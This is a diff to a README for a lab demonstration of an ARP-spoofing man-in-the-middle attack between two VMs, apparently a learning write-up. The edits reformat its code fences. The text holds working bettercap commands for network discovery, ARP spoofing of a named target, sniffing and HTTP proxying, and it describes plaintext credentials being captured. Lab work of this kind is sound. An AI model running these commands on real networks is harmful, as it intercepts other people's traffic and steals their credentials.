@@ -23,13 +23,13 @@ A hands-on demonstration of a classic Man-in-the-Middle (MITM) attack using ARP 
 Both VMs placed on the same NAT network so ARP traffic between them is visible.
 
 ### 2. Enable IP Forwarding
-```bash
+```
 sudo sysctl -w net.ipv4.ip_forward=1
 ```
 Keeps the victim's internet connection alive while traffic is routed through the attacker — makes the attack invisible.
 
 ### 3. Network Discovery
-```bash
+```
 sudo bettercap -iface eth0
 net.probe on
 net.show
@@ -38,27 +38,31 @@ net.show
 *Identifying the gateway and victim IP/MAC addresses on the LAN.*
 
 ### 4. ARP Spoofing
+```
 set arp.spoof.targets 192.168.216.130
 arp.spoof on
+```
 ![ARP spoof set target](arp-spoof-active1.png)
 ![ARP spoof enabled](arp-spoof-active2.png)
 *Kali now sits between the victim and the gateway — spoofing both sides' ARP tables.*
 
 ### 5. Traffic Interception
+```
 net.sniff on
 http.proxy on
-
+```
 Victim logs into a test HTTP login page. Credentials are captured in plaintext.
 
 ![Captured credentials](captured-credentials.png)
 *Plaintext POST request showing intercepted username and password.*
 
 ### 6. Cleanup
+```
 arp.spoof off
 http.proxy off
 net.sniff off
-
-```bash
+```
+```
 sudo sysctl -w net.ipv4.ip_forward=0
 ```
 
